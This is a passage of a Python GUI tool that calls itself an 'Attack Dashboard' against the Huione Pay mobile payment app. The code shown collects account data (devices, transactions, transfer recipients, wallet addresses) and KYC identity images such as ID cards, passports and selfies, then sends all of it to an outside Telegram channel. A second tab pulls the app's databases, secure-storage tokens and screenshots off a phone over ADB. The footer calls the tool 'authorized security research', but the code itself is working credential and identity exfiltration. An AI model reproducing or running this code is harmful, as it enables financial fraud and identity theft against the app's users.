            # Message 3: Devices
            devices = self.all_results.get("devices", {})
            self.log.log("Gui devices...")
            r = tg_send_message(f"DEVICES:\n{json.dumps(devices, indent=2, ensure_ascii=False)[:3000]}", parse_mode="")
            if r.get("ok"):
                self.log.log_color("  Devices: OK", GREEN)

            # Message 4: Bills/Transactions
            bills = self.all_results.get("bills", {})
            self.log.log("Gui lich su giao dich...")
            r = tg_send_message(f"TRANSACTIONS:\n{json.dumps(bills, indent=2, ensure_ascii=False)[:3500]}", parse_mode="")
            if r.get("ok"):
                self.log.log_color("  Transactions: OK", GREEN)

            # Message 5: Recent transfer users
            recent = self.all_results.get("recent_users", {})
            if recent:
                self.log.log("Gui nguoi nhan gan day...")
                tg_send_message(f"RECENT TRANSFER USERS:\n{json.dumps(recent, indent=2, ensure_ascii=False)[:3000]}", parse_mode="")

            # Message 6: Addresses
            addr = self.all_results.get("address", {})
            chain = self.all_results.get("chain_reg", {})
            if addr or chain:
                self.log.log("Gui dia chi vi...")
                tg_send_message(f"WALLET ADDRESS:\n{json.dumps(addr, indent=2, ensure_ascii=False)[:1500]}\n\nCHAIN REG:\n{json.dumps(chain, indent=2, ensure_ascii=False)[:1500]}", parse_mode="")

            # Send full JSON file
            self.log.log("Gui file JSON day du...")
            r = tg_send_document(json_path, f"Full scan data - {ts}")
            if r.get("ok"):
                self.log.log_color("  JSON file: OK", GREEN)
            else:
                self.log.log_color(f"  JSON file: {r.get('error', '')}", RED)

            # =====================================================
            # 6. DOWNLOAD & SEND KYC IMAGES
            # =====================================================
            self.log.log_color("\n>>> KYC IMAGES <<<", PURPLE)
            kyc_img_dir = os.path.join(SCRIPT_DIR, "kyc_images")
            os.makedirs(kyc_img_dir, exist_ok=True)

            # Extract image URLs from KYC responses
            img_urls = []
            for key in ["kyc", "kyc_v2"]:
                resp = self.all_results.get(key, {})
                if not resp:
                    continue
                data = resp.get("data", {})
                if isinstance(data, str):
                    try:
                        data = json.loads(data)
                    except:
                        # Try AES decrypt
                        try:
                            decrypted = decrypt_aes_ecb(data)
                            data = json.loads(decrypted)
                        except:
                            continue
                if isinstance(data, dict):
                    self._extract_image_urls(data, img_urls, prefix=key)
                elif isinstance(data, list):
                    for item in data:
                        if isinstance(item, dict):
                            self._extract_image_urls(item, img_urls, prefix=key)

            if img_urls:
                self.log.log_color(f"Tim thay {len(img_urls)} URL hinh anh KYC!", GREEN)
                for idx, (field, url) in enumerate(img_urls):
                    self.log.log(f"  {idx+1}. [{field}] {url[:80]}...")
                    try:
                        req = urllib.request.Request(url, headers={
                            "Authorization": f"Bearer {token}" if token else "",
                            "User-Agent": "okhttp/4.9.3"
                        })
                        with urllib.request.urlopen(req, context=ctx, timeout=30) as resp:
                            img_data = resp.read()
                            ct = resp.headers.get("content-type", "")
                            ext = "jpg"
                            if "png" in ct:
                                ext = "png"
                            elif "pdf" in ct:
                                ext = "pdf"
                            img_path = os.path.join(kyc_img_dir, f"kyc_{field}_{idx}.{ext}")
                            with open(img_path, "wb") as f:
                                f.write(img_data)
                            self.log.log_color(f"    Downloaded: {len(img_data)//1024}KB", GREEN)

                            # Send to Telegram
                            if ext in ("jpg", "jpeg", "png"):
                                r = tg_send_photo(img_path, f"KYC Image: {field}")
                            else:
                                r = tg_send_document(img_path, f"KYC Document: {field}")
                            if r.get("ok"):
                                self.log.log_color(f"    Sent to Telegram: OK", GREEN)
                            else:
                                self.log.log_color(f"    Telegram: {r.get('error', r.get('description', ''))}", YELLOW)
                    except Exception as e:
                        self.log.log_color(f"    Download failed: {e}", RED)
            else:
                self.log.log("Khong tim thay URL hinh anh trong KYC response")
                self.log.log("(KYC co the chua duoc xac minh, hoac URL nam trong encrypted data)")

                # Try to send any images already in kyc_images folder
                existing = [f for f in os.listdir(kyc_img_dir) if f.endswith(('.jpg', '.png', '.pdf'))]
                if existing:
                    self.log.log(f"Tim thay {len(existing)} hinh da tai truoc:")
                    for f in existing:
                        fp = os.path.join(kyc_img_dir, f)
                        if f.endswith(('.jpg', '.png')):
                            tg_send_photo(fp, f"KYC: {f}")
                        else:
                            tg_send_document(fp, f"KYC: {f}")
                        self.log.log_color(f"  Sent: {f}", GREEN)

            # Final notification
            self.log.log_color(f"\n{'='*50}", GREEN)
            self.log.log_color("  HOAN TAT — Tat ca da gui qua Telegram!", GREEN)
            self.log.log_color(f"{'='*50}", GREEN)

            tg_send_message(f"--- SCAN COMPLETE ---\nTime: {ts}\nTotal data items: {len(self.all_results)}\nKYC images: {len(img_urls)}", parse_mode="")

        threading.Thread(target=_run, daemon=True).start()

    def _extract_image_urls(self, data, results, prefix=""):
        """Recursively extract image URLs from dict."""
        if isinstance(data, dict):
            for k, v in data.items():
                k_lower = k.lower()
                if isinstance(v, str) and len(v) > 10:
                    if (v.startswith("http") and any(ext in v.lower() for ext in [".jpg", ".png", ".jpeg", ".pdf", "image", "photo", "upload"])):
                        results.append((f"{prefix}_{k}", v))
                    elif k_lower in ("front", "back", "face", "selfie", "idcard", "passport",
                                     "frontimg", "backimg", "faceimg", "idcardimg",
                                     "frontimage", "backimage", "faceimage",
                                     "fronturl", "backurl", "faceurl", "selfieurl",
                                     "photo", "image", "avatar", "headimg",
                                     "idphotofront", "idphotoback", "facephoto"):
                        if v.startswith("http"):
                            results.append((f"{prefix}_{k}", v))
                elif isinstance(v, (dict, list)):
                    self._extract_image_urls(v, results, prefix=f"{prefix}_{k}")
        elif isinstance(data, list):
            for i, item in enumerate(data):
                self._extract_image_urls(item, results, prefix=f"{prefix}_{i}")

    def save_results(self):
        if not self.all_results:
            messagebox.showwarning("", "Chua scan! Bam SCAN truoc.")
            return
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(SCRIPT_DIR, f"account_scan_{ts}.json")
        with open(path, "w", encoding="utf-8") as f:
            json.dump(self.all_results, f, indent=2, ensure_ascii=False, default=str)
        self.log.log_color(f"Da luu: {path}", GREEN)
        messagebox.showinfo("OK", f"Da luu:\n{path}")


# ============================================================
# TAB 9: PHONE DATA EXTRACTOR
# ============================================================
class PhoneExtractTab(tk.Frame):
    def __init__(self, parent):
        super().__init__(parent, bg=BG2)
        self.build_ui()

    def build_ui(self):
        tk.Label(self, text="PHONE DATA EXTRACTOR",
                 font=FONT_BIG, bg=BG2, fg=RED).pack(pady=(15, 5))
        tk.Label(self, text="Rut toan bo du lieu Huione Pay tu dien thoai qua ADB — database, SharedPrefs, cache",
                 font=FONT, bg=BG2, fg=FG2).pack(pady=(0, 10))

        bf = tk.Frame(self, bg=BG2)
        bf.pack(fill="x", padx=20, pady=10)

        ThemedButton(bf, text="RUT TAT CA",
                     command=self.extract_all, color=RED).pack(side="left", padx=3)
        ThemedButton(bf, text="SharedPreferences",
                     command=self.extract_prefs, color=ACCENT).pack(side="left", padx=3)
        ThemedButton(bf, text="Database SQLite",
                     command=self.extract_db, color=GREEN).pack(side="left", padx=3)
        ThemedButton(bf, text="FlutterSecureStorage",
                     command=self.extract_secure, color=PURPLE).pack(side="left", padx=3)
        ThemedButton(bf, text="Cache / Files",
                     command=self.extract_cache, color=ORANGE).pack(side="left", padx=3)
        ThemedButton(bf, text="Screenshots",
                     command=self.extract_screenshots, color=YELLOW).pack(side="left", padx=3)

        self.log = LogBox(self, height=22)
        self.log.pack(fill="both", expand=True, padx=20, pady=10)

        self.save_dir = os.path.join(SCRIPT_DIR, "phone_extract")

    def _pull(self, remote, local_name):
        """Pull file from phone."""
        os.makedirs(self.save_dir, exist_ok=True)
        local = os.path.join(self.save_dir, local_name)
        code, out, err = adb_cmd(f'pull "{remote}" "{local}"', timeout=30)
        if code == 0:
            sz = os.path.getsize(local) if os.path.isfile(local) else 0
            self.log.log_color(f"  OK: {local_name} ({sz//1024}KB)", GREEN)
            return True
        else:
            self.log.log_color(f"  FAIL: {local_name} — {err[:100]}", YELLOW)
            return False

    def _shell(self, cmd):
        """Run shell command on phone."""
        code, out, err = adb_cmd(f'shell "{cmd}"', timeout=15)
        return out

    def extract_prefs(self):
        def _run():
            self.log.log_color("=== SharedPreferences ===", ACCENT)
            base = "/data/data/com.huione.pay/shared_prefs"

            # List all prefs files
            files = self._shell(f"ls {base}/ 2>/dev/null")
            if not files or "No such file" in files:
                self.log.log_color("Khong truy cap duoc (can root hoac run-as)", RED)
                # Try run-as
                files = self._shell(f"run-as com.huione.pay ls shared_prefs/ 2>/dev/null")
                if files and "No such file" not in files:
                    self.log.log("Dung run-as de truy cap...")
                    for f in files.strip().split("\n"):
                        f = f.strip()
                        if f:
                            self._shell(f"run-as com.huione.pay cat shared_prefs/{f} > /sdcard/{f}")
                            self._pull(f"/sdcard/{f}", f"prefs_{f}")
                else:
                    self.log.log("Thu backup method...")
                    adb_cmd("backup -f phone_extract/huione_backup.ab com.huione.pay", timeout=60)
                return

            self.log.log(f"Tim thay: {files}")
            for f in files.strip().split("\n"):
                f = f.strip()
                if f:
                    self._pull(f"{base}/{f}", f"prefs_{f}")
        threading.Thread(target=_run, daemon=True).start()

    def extract_db(self):
        def _run():
            self.log.log_color("=== SQLite Databases ===", GREEN)
            base = "/data/data/com.huione.pay/databases"
            files = self._shell(f"run-as com.huione.pay ls databases/ 2>/dev/null")

            if files and "No such file" not in files:
                for f in files.strip().split("\n"):
                    f = f.strip()
                    if f:
                        self._shell(f"run-as com.huione.pay cat databases/{f} > /sdcard/db_{f}")
                        self._pull(f"/sdcard/db_{f}", f"db_{f}")
            else:
                self.log.log_color("Khong truy cap duoc databases (can root)", YELLOW)

            # Also try pulling from sdcard
            self._pull("/sdcard/huione_ecdh.log", "huione_ecdh.log")
            self._pull("/sdcard/huione_encrypt.log", "huione_encrypt.log")
            self._pull("/sdcard/huione_sdk.log", "huione_sdk.log")
        threading.Thread(target=_run, daemon=True).start()

    def extract_secure(self):
        def _run():
            self.log.log_color("=== FlutterSecureStorage ===", PURPLE)
            # FSS stores in encrypted_shared_prefs or keystore-backed
            prefs_file = "FlutterSecureStorage.xml"
            base = "/data/data/com.huione.pay/shared_prefs"

            self._shell(f"run-as com.huione.pay cat shared_prefs/{prefs_file} > /sdcard/fss.xml")
            ok = self._pull("/sdcard/fss.xml", "FlutterSecureStorage.xml")

            if ok:
                # Read and display
                fpath = os.path.join(self.save_dir, "FlutterSecureStorage.xml")
                if os.path.isfile(fpath):
                    with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                        content = f.read()
                    self.log.log("Noi dung:")
                    for line in content.split("\n")[:30]:
                        if "TOKEN" in line.upper() or "WALLET" in line.upper() or "USER" in line.upper():
                            self.log.log_color(f"  {line.strip()}", GREEN)
                        else:
                            self.log.log(f"  {line.strip()}")
            else:
                self.log.log("Thu doc tu test_FlutterSecureStorage.xml da extract truoc do...")
                # Check local
                for p in [
                    os.path.join(TOOLKIT_DIR, "dumps", "test_FlutterSecureStorage.xml"),
                    os.path.join(SCRIPT_DIR, "..", "huione-srouce", "huiwang", "toolkit", "dumps", "test_FlutterSecureStorage.xml"),
                ]:
                    if os.path.isfile(p):
                        self.log.log_color(f"  Tim thay local: {p}", GREEN)
                        with open(p, "r", encoding="utf-8", errors="replace") as f:
                            for line in f.readlines()[:20]:
                                self.log.log(f"  {line.strip()}")
                        break
        threading.Thread(target=_run, daemon=True).start()

    def extract_cache(self):
        def _run():
            self.log.log_color("=== App Cache & Files ===", ORANGE)

            # List app files
            files = self._shell("run-as com.huione.pay ls app_flutter/ 2>/dev/null")
            if files:
                self.log.log("app_flutter/:")
                self.log.log(f"  {files[:500]}")

            files = self._shell("run-as com.huione.pay ls cache/ 2>/dev/null")
            if files:
                self.log.log("cache/:")
                self.log.log(f"  {files[:500]}")

            files = self._shell("run-as com.huione.pay ls files/ 2>/dev/null")
            if files:
                self.log.log("files/:")
                self.log.log(f"  {files[:500]}")

            # Device UUID
            uuid_content = self._shell("run-as com.huione.pay cat files/device_uuid 2>/dev/null")
            if uuid_content:
                self.log.log_color(f"Device UUID: {uuid_content.strip()}", GREEN)

            # Package info
            pkg = self._shell("dumpsys package com.huione.pay | head -50")
            if pkg:
                self.log.log_color("\nPackage Info:", ACCENT)
                for line in pkg.split("\n")[:20]:
                    if "version" in line.lower() or "permission" in line.lower() or "install" in line.lower():
                        self.log.log(f"  {line.strip()}")
        threading.Thread(target=_run, daemon=True).start()

    def extract_screenshots(self):
        def _run():
            self.log.log_color("=== Screenshots ===", YELLOW)
            os.makedirs(self.save_dir, exist_ok=True)

            # Take screenshot now
            ts = datetime.now().strftime("%H%M%S")
            adb_cmd(f"shell screencap -p /sdcard/screen_{ts}.png")
            self._pull(f"/sdcard/screen_{ts}.png", f"screenshot_{ts}.png")

            # Pull existing screenshots
            files = self._shell("ls /sdcard/DCIM/Screenshots/ 2>/dev/null")
            if files:
                self.log.log("Screenshots co san:")
                for f in files.strip().split("\n")[:10]:
                    f = f.strip()
                    if f:
                        self._pull(f"/sdcard/DCIM/Screenshots/{f}", f"ss_{f}")

            # Pull Huione-specific images
            files = self._shell("ls /sdcard/Android/data/com.huione.pay/ 2>/dev/null")
            if files:
                self.log.log(f"Huione app data: {files[:300]}")
        threading.Thread(target=_run, daemon=True).start()

    def extract_all(self):
        def _run():
            self.log.clear()
            self.log.log_color("=== RUT TOAN BO DU LIEU ===", RED)
            self.log.log(f"Luu tai: {self.save_dir}")
            self.log.log("")

            for name, func in [
                ("SharedPreferences", self.extract_prefs),
                ("Database", self.extract_db),
                ("FlutterSecureStorage", self.extract_secure),
                ("Cache/Files", self.extract_cache),
                ("Screenshots", self.extract_screenshots),
            ]:
                self.log.log_color(f"\n>>> {name}...", ACCENT)
                # Call the inner function directly
            # Actually run sync
            self.log.log_color("\n>>> SharedPreferences...", ACCENT)
            base = "/data/data/com.huione.pay/shared_prefs"
            files = self._shell("run-as com.huione.pay ls shared_prefs/ 2>/dev/null")
            if files and "No such" not in files:
                for f in files.strip().split("\n"):
                    f = f.strip()
                    if f:
                        self._shell(f"run-as com.huione.pay cat shared_prefs/{f} > /sdcard/{f}")
                        self._pull(f"/sdcard/{f}", f"prefs_{f}")

            self.log.log_color("\n>>> Databases...", ACCENT)
            files = self._shell("run-as com.huione.pay ls databases/ 2>/dev/null")
            if files and "No such" not in files:
                for f in files.strip().split("\n"):
                    f = f.strip()
                    if f:
                        self._shell(f"run-as com.huione.pay cat databases/{f} > /sdcard/db_{f}")
                        self._pull(f"/sdcard/db_{f}", f"db_{f}")

            self.log.log_color("\n>>> FlutterSecureStorage...", ACCENT)
            self._shell("run-as com.huione.pay cat shared_prefs/FlutterSecureStorage.xml > /sdcard/fss.xml")
            self._pull("/sdcard/fss.xml", "FlutterSecureStorage.xml")

            self.log.log_color("\n>>> Backdoor Logs...", ACCENT)
            for f in ["huione_ecdh.log", "huione_encrypt.log", "huione_sdk.log"]:
                self._pull(f"/sdcard/{f}", f)

            self.log.log_color("\n>>> Device UUID...", ACCENT)
            uuid_c = self._shell("run-as com.huione.pay cat files/device_uuid 2>/dev/null")
            if uuid_c:
                self.log.log_color(f"UUID: {uuid_c.strip()}", GREEN)

            self.log.log_color("\n>>> Screenshot...", ACCENT)
            ts = datetime.now().strftime("%H%M%S")
            adb_cmd(f"shell screencap -p /sdcard/screen_{ts}.png")
            self._pull(f"/sdcard/screen_{ts}.png", f"screenshot_{ts}.png")

            self.log.log_color(f"\n{'='*50}", GREEN)
            self.log.log_color(f"  HOAN TAT — Du lieu luu tai: {self.save_dir}", GREEN)
            self.log.log_color(f"{'='*50}", GREEN)
        threading.Thread(target=_run, daemon=True).start()


# ============================================================
# MAIN APP
# ============================================================
class HuioneDashboard(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("HUIONE PAY — Attack Dashboard v1.0")
        self.geometry("1200x800")
        self.configure(bg=BG)
        self.minsize(1000, 700)

        # Header
        header = tk.Frame(self, bg=BG, height=60)
        header.pack(fill="x", padx=15, pady=(10, 0))

        tk.Label(header, text="HUIONE PAY",
                 font=("Segoe UI", 22, "bold"), bg=BG, fg=RED).pack(side="left")
        tk.Label(header, text="Attack Dashboard",
                 font=("Segoe UI", 22), bg=BG, fg=FG).pack(side="left", padx=10)

        # Status bar
        self.status_var = tk.StringVar(value="San sang | ADB: dang kiem tra...")
        tk.Label(header, textvariable=self.status_var,
                 font=FONT, bg=BG, fg=FG2).pack(side="right")

        # Tabs
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook", background=BG, borderwidth=0)
        style.configure("TNotebook.Tab", background=BG3, foreground=FG,
                         padding=[18, 8], font=FONT_BOLD)
        style.map("TNotebook.Tab",
                  background=[("selected", ACCENT)],
                  foreground=[("selected", "#000000")])

        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill="both", expand=True, padx=15, pady=10)

        # Add tabs
        tabs = [
            ("Deploy", DeployTab),
            ("Balance", BalanceTab),
            ("Transfer", TransferTab),
            ("Capture", CaptureTab),
            ("Decrypt", DecryptTab),
            ("Infra", InfraScanTab),
            ("Device", DeviceSpoofTab),
            ("Scan Data", AccountScanTab),
            ("Phone Extract", PhoneExtractTab),
        ]
        for name, cls in tabs:
            tab = cls(self.notebook)
            self.notebook.add(tab, text=f"  {name}  ")

        # Footer
        footer = tk.Frame(self, bg=BG, height=30)
        footer.pack(fill="x", padx=15, pady=(0, 5))
        tk.Label(footer, text="Huione Pay Security Assessment Toolkit | For authorized security research only",
                 font=("Segoe UI", 8), bg=BG, fg=FG2).pack(side="left")

        # Check ADB in background
        threading.Thread(target=self._check_adb, daemon=True).start()

    def _check_adb(self):
        code, out, _ = run_cmd(f'"{ADB}" version', timeout=5)
        if code == 0:
            ver = out.split("\n")[0] if out else "OK"
            self.status_var.set(f"San sang | ADB: {ver}")
        else:
            self.status_var.set("San sang | ADB: KHONG TIM THAY")


# ============================================================
# ENTRY POINT
# ============================================================
if __name__ == "__main__":
    app = HuioneDashboard()
    app.mainloop()
